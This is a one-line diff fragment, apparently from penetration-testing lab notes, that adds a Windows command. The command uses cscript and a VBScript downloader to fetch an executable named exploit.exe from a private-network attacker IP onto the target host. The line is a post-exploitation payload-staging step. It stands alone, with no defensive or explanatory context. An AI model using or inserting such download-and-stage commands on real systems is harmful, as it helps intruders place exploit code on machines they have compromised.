@@ -1,0 +1,1 @@
+cscript wget.vbs http://10.11.0.187/exploit.exe exploit.exe
